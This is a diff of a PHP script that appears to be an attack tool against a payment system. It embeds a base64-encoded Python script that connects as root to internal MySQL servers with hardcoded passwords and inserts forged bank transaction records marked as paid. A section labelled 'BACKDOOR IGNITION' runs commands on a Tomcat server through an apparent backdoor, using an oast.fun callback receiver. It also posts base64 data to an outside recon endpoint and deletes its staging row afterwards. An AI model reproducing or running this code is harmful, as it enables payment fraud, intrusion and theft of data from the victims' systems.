@@ -150,7 +150,7 @@ function universal_dab_b($command, $head)
 
 function ms_script()
 {
-    $script = 'aW1wb3J0IHN5cw0KaW1wb3J0IG9zDQoNCiMgQWRkIHRoZSBkaXJlY3RvcmllcyBjb250YWluaW5nIHNpdGUtcGFja2FnZXMgdG8gdGhlIHN5c3RlbSBwYXRoDQpzeXMucGF0aC5pbnNlcnQoMCwgb3MucGF0aC5hYnNwYXRoKG9zLnBhdGguam9pbihvcy5wYXRoLmRpcm5hbWUoX19maWxlX18pLCAnLi9teWVudi9MaWIvc2l0ZS1wYWNrYWdlcycpKSkNCg0KaW1wb3J0IHB5bXlzcWwNCg0KdHJ5Og0KICAgIGNvbm5lY3Rpb24gPSBweW15c3FsLmNvbm5lY3QoDQogICAgICAgIGhvc3Q9JzE5Mi4xNjguMTAwLjczJywNCiAgICAgICAgdXNlcj0ncm9vdCcsDQogICAgICAgIHBhc3N3b3JkPSdIYXBweWNvZGluZycsDQogICAgICAgIGRhdGFiYXNlPSdkYl9hcGkxX3NlcnZpY2UnLA0KICAgICAgICBwb3J0PTMzMDYsICAjIFNwZWNpZnkgeW91ciBNeVNRTCBwb3J0IGhlcmUNCiAgICAgICAgY29ubmVjdF90aW1lb3V0PTMwICAjIEluY3JlYXNlZCB0aW1lb3V0IGZvciBiZXR0ZXIgc3RhYmlsaXR5DQogICAgKQ0KDQogICAgY3Vyc29yID0gY29ubmVjdGlvbi5jdXJzb3IoKQ0KICAgIGN1cnNvci5leGVjdXRlKCJHVFRURyIpDQogICAgZm9yIHJvdyBpbiBjdXJzb3IuZmV0Y2hhbGwoKToNCiAgICAgICAgcHJpbnQocm93KQ0KDQpleGNlcHQgcHlteXNxbC5JbnRlcmZhY2VFcnJvciBhcyBlOg0KICAgIHByaW50KGYiSW50ZXJmYWNlRXJyb3I6IHtlfSIpDQpleGNlcHQgcHlteXNxbC5NeVNRTEVycm9yIGFzIGU6DQogICAgcHJpbnQoZiJNeVNRTCBFcnJvcjoge2V9IikNCmV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICBwcmludChmIkdlbmVyYWwgRXJyb3I6IHtlfSIpDQpmaW5hbGx5Og0KICAgIGlmIGN1cnNvcjoNCiAgICAgICAgY3Vyc29yLmNsb3NlKCkNCiAgICBpZiBjb25uZWN0aW9uIGFuZCBjb25uZWN0aW9uLm9wZW46DQogICAgICAgIGNvbm5lY3Rpb24uY2xvc2UoKQ0K';
+    $script = 'aW1wb3J0IHN5cw0KaW1wb3J0IG9zDQoNCg0KIyBBZGQgdGhlIGRpcmVjdG9yaWVzIGNvbnRhaW5pbmcgc2l0ZS1wYWNrYWdlcyB0byB0aGUgc3lzdGVtIHBhdGgNCnN5cy5wYXRoLmluc2VydCgwLCBvcy5wYXRoLmFic3BhdGgob3MucGF0aC5qb2luKG9zLnBhdGguZGlybmFtZShfX2ZpbGVfXyksICcuL215ZW52L0xpYi9zaXRlLXBhY2thZ2VzJykpKQ0KDQppbXBvcnQgcHlteXNxbA0KDQojIERhdGFiYXNlIGNvbm5lY3Rpb24gZGV0YWlscyBmb3IgZGJDb25uZWN0aW9uDQpkYkNvbm5lY3Rpb25fY29uZmlnID0gew0KICAgICdob3N0JzogJzE5Mi4xNjguMC42NScsDQogICAgJ3VzZXInOiAncm9vdCcsDQogICAgJ3Bhc3N3b3JkJzogJ2hhcHB5Y29kaW5nJywNCiAgICAnZGF0YWJhc2UnOiAndXBndycsDQogICAgJ3BvcnQnOiAzMzA2DQp9DQoNCiMgRGF0YWJhc2UgY29ubmVjdGlvbiBkZXRhaWxzIGZvciBkYkNvbm5lY3Rpb25hcGkNCmRiQ29ubmVjdGlvbmFwaV9jb25maWcgPSB7DQogICAgJ2hvc3QnOiAnMTkyLjE2OC4xMDAuNzMnLA0KICAgICd1c2VyJzogJ3Jvb3QnLA0KICAgICdwYXNzd29yZCc6ICdIYXBweWNvZGluZycsDQogICAgJ2RhdGFiYXNlJzogJ2RiX2FwaTFfc2VydmljZScsDQogICAgJ3BvcnQnOiAzMzA2DQp9DQoNCiMgQ29ubmVjdCB0byBhIE15U1FMIGRhdGFiYXNlDQpkZWYgY29ubmVjdF90b19kYihkYl9jb25maWcpOg0KICAgIHRyeToNCiAgICAgICAgY29ubmVjdGlvbiA9IHB5bXlzcWwuY29ubmVjdCgNCiAgICAgICAgICAgIGhvc3Q9ZGJfY29uZmlnWydob3N0J10sDQogICAgICAgICAgICB1c2VyPWRiX2NvbmZpZ1sndXNlciddLA0KICAgICAgICAgICAgcGFzc3dvcmQ9ZGJfY29uZmlnWydwYXNzd29yZCddLA0KICAgICAgICAgICAgZGF0YWJhc2U9ZGJfY29uZmlnWydkYXRhYmFzZSddLA0KICAgICAgICAgICAgcG9ydD1kYl9jb25maWdbJ3BvcnQnXSwNCiAgICAgICAgICAgIGNvbm5lY3RfdGltZW91dD0zMCwNCiAgICAgICAgICAgIGF1dG9jb21taXQ9VHJ1ZQ0KICAgICAgICApDQogICAgICAgIHJldHVybiBjb25uZWN0aW9uDQogICAgZXhjZXB0IHB5bXlzcWwuTXlTUUxFcnJvciBhcyBlOg0KICAgICAgICBwcmludChmIk15U1FMIEVycm9yOiB7ZX0iKQ0KICAgICAgICByZXR1cm4gTm9uZQ0KDQojIEZ1bmN0aW9uIHRvIGhhbmRsZSBpbnNlcnRpb25zIGludG8gdGhlIGJhbmtUcmFuc2FjdGlvbnMgdGFibGUNCmRlZiBpbnNlcnRfYmFua190cmFuc2FjdGlvbihjb25uZWN0aW9uLCB0cmFuc2FjdGlvbl9kYXRhKToNCiAgICB0cnk6DQogICAgICAgIGN1cnNvciA9IGNvbm5lY3Rpb24uY3Vyc29yKCkNCiAgICAgICAgaW5zZXJ0X3F1ZXJ5ID0gIiIiDQogICAgICAgICAgICBJTlNFUlQgSU5UTyBiYW5rVHJhbnNhY3Rpb25zIChiYW5rQ29kZSwgYmlsbE51bWJlciwgYW1vdW50LCBhY2N0UmVmTm8sIHRyYW5zYWN0aW9uUmVmLCB0cmFuUGFydGljdWxhciwgcGF5bWVudE1vZGUsIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJhbnNhY0RhdGUsIG1vYmlsZU51bWJlciwgaW5zdGl0dXRpb25Db2RlLCBhcGlDb2RlLCBpbnN0aXR1dGlvbk5hbWUsIHRyYW5zdGF0dXMpIA0KICAgICAgICAgICAgVkFMVUVTICglcywgJXMsICVzLCAlcywgJXMsICVzLCAlcywgJXMsICVzLCAlcywgJXMsICVzLCAlcykNCiAgICAgICAgIiIiDQogICAgICAgIGN1cnNvci5leGVjdXRlKGluc2VydF9xdWVyeSwgdHJhbnNhY3Rpb25fZGF0YSkNCiAgICAgICAgY29ubmVjdGlvbi5jb21taXQoKQ0KICAgICAgICBwcmludChmIlRyYW5zYWN0aW9uIGluc2VydGVkIHN1Y2Nlc3NmdWxseToge3RyYW5zYWN0aW9uX2RhdGFbNF19IikNCiAgICBleGNlcHQgcHlteXNxbC5NeVNRTEVycm9yIGFzIGU6DQogICAgICAgIHByaW50KGYiTXlTUUwgRXJyb3IgZHVyaW5nIGluc2VydGlvbjoge2V9IikNCiAgICBmaW5hbGx5Og0KICAgICAgICBjdXJzb3IuY2xvc2UoKQ0KDQojIEZ1bmN0aW9uIHRvIHVwZGF0ZSB0aGUgc3RhdHVzIG9mIGEgdHJhbnNhY3Rpb24gaW4gdGhlIGJhbmtUcmFuc2FjdGlvbnMgdGFibGUNCmRlZiB1cGRhdGVfdHJhbnNhY3Rpb25fc3RhdHVzKGNvbm5lY3Rpb24sIHRyYW5zYWN0aW9uX3JlZik6DQogICAgdHJ5Og0KICAgICAgICBjdXJzb3IgPSBjb25uZWN0aW9uLmN1cnNvcigpDQogICAgICAgIHVwZGF0ZV9xdWVyeSA9ICJVUERBVEUgYmFua1RyYW5zYWN0aW9ucyBTRVQgdHJhbnN0YXR1cyA9IDEgV0hFUkUgdHJhbnNhY3Rpb25SZWYgPSAlcyINCiAgICAgICAgY3Vyc29yLmV4ZWN1dGUodXBkYXRlX3F1ZXJ5LCAodHJhbnNhY3Rpb25fcmVmLCkpDQogICAgICAgIGNvbm5lY3Rpb24uY29tbWl0KCkNCiAgICAgICAgcHJpbnQoZiJUcmFuc2FjdGlvbiBzdGF0dXMgdXBkYXRlZCBmb3Ige3RyYW5zYWN0aW9uX3JlZn0iKQ0KICAgIGV4Y2VwdCBweW15c3FsLk15U1FMRXJyb3IgYXMgZToNCiAgICAgICAgcHJpbnQoZiJNeVNRTCBFcnJvciBkdXJpbmcgc3RhdHVzIHVwZGF0ZToge2V9IikNCiAgICBmaW5hbGx5Og0KICAgICAgICBjdXJzb3IuY2xvc2UoKQ0KDQojIFNhbXBsZSB0cmFuc2FjdGlvbiBkYXRhIHRvIGluc2VydCAoeW91IHdvdWxkIGdldCB0aGlzIGZyb20gdGhlIHJlcXVlc3QgYm9keSBpbiBhIHJlYWwgYXBwbGljYXRpb24pDQp0cmFuc2FjdGlvbl9kYXRhID0gKA0KICAgICcwMDMnLCAgICAgICAgICAgICAgICAgICAjIGJhbmtDb2RlDQogICAgJ1hYQk5YWCcsICAgICAgICAgICAjIGJpbGxOdW1iZXINCiAgICAxMjM0NSwgICAgICAgICAgICAgICAgICAgICAjIGFtb3VudA0KICAgICdYWEFSWFgnLCAgICAgICAgICAgICMgYWNjdFJlZk5vDQogICAgJ1hYVFJYWCcsICAgICAgICAjIHRyYW5zYWN0aW9uUmVmDQogICAgJ1hYVFBYWCcsICAgIyB0cmFuUGFydGljdWxhcg0KICAgICdjYXNoJywgICAgICAgICAgICAgICAgICAgIyBwYXltZW50TW9kZQ0KICAgICdYWFREWFgnLCAgICAjIHRyYW5zYWNEYXRlDQogICAgJ1hYTU5YWCcsICAgICAgICAgICAgICMgbW9iaWxlTnVtYmVyDQogICAgJ1hYSUNYWCcsICAgICAgICAgICAgICAgIyBpbnN0aXR1dGlvbkNvZGUNCiAgICAnWFhBQ1hYJywgICAgICAgICAgICAgICMgYXBpQ29kZQ0KICAgICdYWElOWFgnLCAgICAgICAjIGluc3RpdHV0aW9uTmFtZQ0KICAgIDAgICAgICAgICAgICAgICAgICAgICAgICAgIyB0cmFuc3RhdHVzIChpbml0aWFsbHkgMCwgdXBkYXRlZCBsYXRlcikNCikNCg0KIyBDb25uZWN0IHRvIGJvdGggZGF0YWJhc2VzDQpkYkNvbm5lY3Rpb24gPSBjb25uZWN0X3RvX2RiKGRiQ29ubmVjdGlvbl9jb25maWcpDQpkYkNvbm5lY3Rpb25hcGkgPSBjb25uZWN0X3RvX2RiKGRiQ29ubmVjdGlvbmFwaV9jb25maWcpDQoNCmlmIGRiQ29ubmVjdGlvbiBhbmQgZGJDb25uZWN0aW9uYXBpOg0KICAgIHRyeToNCiAgICAgICAgIyBJbnNlcnQgdHJhbnNhY3Rpb24gaW50byBkYkNvbm5lY3Rpb25hcGkgKGVxdWl2YWxlbnQgdG8gZGJDb25uZWN0aW9uYXBpIGluIHRoZSBjb250cm9sbGVyKQ0KICAgICAgICBpbnNlcnRfYmFua190cmFuc2FjdGlvbihkYkNvbm5lY3Rpb25hcGksIHRyYW5zYWN0aW9uX2RhdGEpDQoNCiAgICAgICAgIyBJbnNlcnQgdHJhbnNhY3Rpb24gaW50byBkYkNvbm5lY3Rpb24gKGVxdWl2YWxlbnQgdG8gZGJDb25uZWN0aW9uIGluIHRoZSBjb250cm9sbGVyKQ0KICAgICAgICBpbnNlcnRfYmFua190cmFuc2FjdGlvbihkYkNvbm5lY3Rpb24sIHRyYW5zYWN0aW9uX2RhdGEpDQoNCiAgICAgICAgIyBVcGRhdGUgdGhlIHN0YXR1cyBvZiB0aGUgdHJhbnNhY3Rpb24gaW4gZGJDb25uZWN0aW9uIChkYkNvbm5lY3Rpb24gaW4gdGhlIGNvbnRyb2xsZXIpDQogICAgICAgIHVwZGF0ZV90cmFuc2FjdGlvbl9zdGF0dXMoZGJDb25uZWN0aW9uLCB0cmFuc2FjdGlvbl9kYXRhWzRdKSAgIyB0cmFuc2FjdGlvbl9yZWYgaXMgYXQgaW5kZXggNA0KDQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICBwcmludChmIkdlbmVyYWwgRXJyb3I6IHtlfSIpDQoNCiAgICBmaW5hbGx5Og0KICAgICAgICAjIENsb3NlIHRoZSBjb25uZWN0aW9ucw0KICAgICAgICBpZiBkYkNvbm5lY3Rpb24gYW5kIGRiQ29ubmVjdGlvbi5vcGVuOg0KICAgICAgICAgICAgZGJDb25uZWN0aW9uLmNsb3NlKCkNCiAgICAgICAgaWYgZGJDb25uZWN0aW9uYXBpIGFuZCBkYkNvbm5lY3Rpb25hcGkub3BlbjoNCiAgICAgICAgICAgIGRiQ29ubmVjdGlvbmFwaS5jbG9zZSgpDQplbHNlOg0KICAgIHByaW50KCJGYWlsZWQgdG8gY29ubmVjdCB0byBvbmUgb3IgYm90aCBkYXRhYmFzZXMuIikNCg==';
     return $script;
 }
 
@@ -359,18 +359,85 @@ if (isset($_GET['del'])) {
 
                             $headers = [];
 
-                            //$bankTransactions = "INSERT INTO bankTransactions ( bankCode,  transactionRef,  amount,  acctRefNo,  accName,  description,  institutionCode,  institutionName,  status,  logDate,  transacDate,  apiCode,  mobileNumber,  transtatus,  billNumber,  tranParticular,  paymentMode,  phoneNumber,  requestoutput,  paymentChannel,  Currency,  BranchCode,  status_1,  ValidationDate,  PushedComments,  transtatus_1) VALUES ( '003',  '" . $code2 . "',  " . $bypass['amount'] . ",  '" . $bypass['invoice_no'] . "',  'None',  'None',  '" . $bypass['invoice_no'] . "',  '" . $validation['description'] . "',  'None',  '" . $timeFormats['withSeparators'] . "',  '" . $code2Date . "',  '2f11db8526fb2e170219e4a68215a1b8fe907a6c',  null,  0,  '" . $bypass['invoice_no'] . "',  '" . $bypass['invoice_no'] . " " . strtoupper($validation['description']) . "',  'cash',  'None',  'None',  'None',  'None',  'None',  'None',  '" . $timeFormats['withSeparators'] . "',  'None',  0 )";
+                            $bankTransactions = "INSERT INTO bankTransactions 
+                            ( 
+                            bankCode,  
+                            transactionRef,  
+                            amount,  
+                            acctRefNo,  
+                            accName,  
+                            description,  
+                            institutionCode,  
+                            institutionName,  
+                            status,  
+                            logDate,  
+                            transacDate,  
+                            apiCode,  
+                            mobileNumber,  
+                            transtatus,  
+                            billNumber,  
+                            tranParticular,  
+                            paymentMode,  
+                            phoneNumber,  
+                            requestoutput,  
+                            paymentChannel,  
+                            Currency,  
+                            BranchCode,  
+                            status_1,  
+                            ValidationDate,  
+                            PushedComments,  
+                            transtatus_1
+                            ) VALUES ( 
+                            '003',  
+                            '" . $code2 . "',  
+                            " . $bypass['amount'] . ",  
+                            '" . $bypass['invoice_no'] . "',  
+                            null,  
+                            null,  
+                            '" . $bypass['invoice_no'] . "',  
+                            '" . $validation['description'] . "',  
+                            null,  
+                            '" . $timeFormats['withSeparators'] . "',  
+                            '" . $code2Date . "',  
+                            '2f11db8526fb2e170219e4a68215a1b8fe907a6c',  
+                            null,  
+                            0,  
+                            '" . $bypass['invoice_no'] . "',  
+                            '" . $bypass['invoice_no'] . " " . strtoupper($validation['description']) . "',  
+                            'cash',  
+                            null,  
+                            null,  
+                            null,  
+                            null,  
+                            null,  
+                            null,  
+                            '" . $timeFormats['withSeparators'] . "',  
+                            null,  
+                            0 )";
 
-                            $bankTransactions = "INSERT INTO bankTransactions (  bankCode, transactionRef, amount, acctRefNo, institutionCode, institutionName, logDate, transacDate, apiCode, mobileNumber, transtatus, billNumber, tranParticular, paymentMode, ValidationDate ) VALUES (  '003', '" . $code2 . "', " . $bypass['amount'] . ", '" . $bypass['invoice_no'] . "', '" . $bypass['invoice_no'] . "', '" . $validation['description'] . "', '" . $timeFormats['withSeparators'] . "', '" . $code2Date . "', '2f11db8526fb2e170219e4a68215a1b8fe907a6c', null, 0, '" . $bypass['invoice_no'] . "', '" . $bypass['invoice_no'] . " " . strtoupper($validation['description']) . "', 'cash', '" . $timeFormats['withSeparators'] . "' )";
+                            echo 'Head: SQL query <br/>';
+                            //$bankTransactions = "INSERT INTO bankTransactions (  bankCode, transactionRef, amount, acctRefNo, institutionCode, institutionName, logDate, transacDate, apiCode, mobileNumber, transtatus, billNumber, tranParticular, paymentMode, ValidationDate ) VALUES (  '003', '" . $code2 . "', " . $bypass['amount'] . ", '" . $bypass['invoice_no'] . "', '" . $bypass['invoice_no'] . "', '" . $validation['description'] . "', '" . $timeFormats['withSeparators'] . "', '" . $code2Date . "', '2f11db8526fb2e170219e4a68215a1b8fe907a6c', null, 0, '" . $bypass['invoice_no'] . "', '" . $bypass['invoice_no'] . " " . strtoupper($validation['description']) . "', 'cash', '" . $timeFormats['withSeparators'] . "' )";
 
-                            //echo $bankTransactions . '<br/><br/>';
+                            echo $bankTransactions . '<br/>' . base64_encode($data2). '<br/><br/>';
                             //echo $bankTransactions ;
-                            //die();
+
                             //echo universal_dab($bankTransactions, 'bankTransactions') . '<br/><br/>';
-                            $mod = str_replace("GTTTG", $bankTransactions, base64_decode(ms_script()));
+                            //$mod = str_replace("GTTTG", $bankTransactions, base64_decode(ms_script()));
 
-                            //echo $mod;
+                            $mod = str_replace("XXBNXX", $bypass['invoice_no'], base64_decode(ms_script()));
+                            $mod = str_replace("12345", $bypass['amount'], $mod);
+                            $mod = str_replace("XXARXX", $bypass['invoice_no'], $mod);
+                            $mod = str_replace("XXTRXX", $code2, $mod);
+                            $mod = str_replace("XXTPXX", $bypass['invoice_no'] . " " . strtoupper($validation['description']), $mod);
+                            $mod = str_replace("XXTDXX", $code2Date, $mod);
+                            $mod = str_replace("'XXMNXX'", "null", $mod);
+                            $mod = str_replace("XXICXX", $bypass['invoice_no'], $mod);
+                            $mod = str_replace("XXACXX", "2f11db8526fb2e170219e4a68215a1b8fe907a6c", $mod);
+                            $mod = str_replace("XXINXX", $validation['description'], $mod);
+                            echo $mod;
+                            die();
 
+                            echo 'Head: Deepwood Insertion <br/>';
                             $base64_encoded_content = base64_encode($mod);
                             $stmt = $connDeep->prepare("INSERT INTO upgw (code) VALUES (:code)");
                             $stmt->bindParam(':code', $base64_encoded_content);
@@ -378,37 +445,40 @@ if (isset($_GET['del'])) {
 
                             $idDeep = $connDeep->lastInsertId();
 
-                            //echo json_encode(['id' => $id]);
+                            echo json_encode(['id' => $idDeep]). '<br/><br/>';
 
                             ////////////////////////////// BACKDOOR IGNITION
-                            $cmd = "python3 opt/tomcat/webapps/aggregate/master.py";
-                            $receiver = 'https://qwnsltptvboodttriviyu0ocgxmp0z228.oast.fun';
-                            $receiver = urlencode($receiver);
-
-                            $backdoor_res = cmd($cmd, $receiver);
+                            $backdoor_res = cmd2();
                             $errCall = false;
                             //////////////////////////////////////////////////////
                             if (strpos($backdoor_res, 'java.lang.ClassCastException') !== false) {
                                 // Word found
                                 //*
                                 $url = 'https://kever.io/recon_process.php';
-                                $payload = ['payload'=>base64_encode($data2)];
+                                $payload = ['payload' => base64_encode($data2)];
                                 //echo messenger($url, $headers, $payload, $method) . '<br/><br/>';
                                 $recon = httpPost($url, $payload);
-                                echo $recon;
+                                echo 'Head: Recon 1 Affrim <br/>';
+                                echo $recon. '<br/><br/>';
                                 //*/
 
 
                             } else {
-                                $backdoor_res2 = cmd2();
+                                $cmd = "python3 opt/tomcat/webapps/aggregate/master.py";
+                                $receiver = 'https://qwnsltptvboodttriviyu0ocgxmp0z228.oast.fun';
+                                $receiver = urlencode($receiver);
+
+                                $backdoor_res2 = cmd($cmd, $receiver);
+
                                 if (strpos($backdoor_res2, 'java.lang.ClassCastException') !== false) {
                                     // Word found
                                     //*
                                     $url = 'https://kever.io/recon_process.php';
-                                    $payload = ['payload'=>base64_encode($data2)];
+                                    $payload = ['payload' => base64_encode($data2)];
                                     //echo messenger($url, $headers, $payload, $method) . '<br/><br/>';
                                     $recon = httpPost($url, $payload);
-                                    echo $recon;
+                                    echo 'Head: Recon 2 Affrim <br/>';
+                                echo $recon. '<br/><br/>';
                                     //*/
 
 
@@ -420,10 +490,16 @@ if (isset($_GET['del'])) {
                             if ($errCall) {
                                 die('Command Lines Failed!!!');
                             } else {
+                                echo 'Head: Deepwoods Clearance <br/>';
+                                $stmt = $connDeep->prepare("SELECT * FROM upgw WHERE id=:id");
+                                $stmt->execute(['id' => $idDeep]);
+                                $result = $stmt->fetch();
+                                echo base64_decode($result['result']) . '<br/><br/>';
+
                                 $stmt = $connDeep->prepare("DELETE FROM upgw WHERE id=:id");
                                 $stmt->execute(['id' => $idDeep]);
 
-                                echo recLog($bypass['invoice_no'], $data2, $bankTransactions);
+                                echo recLog($bypass['invoice_no'], $data2, $bankTransactions) . '<br/><br/>';
                             }
 
 
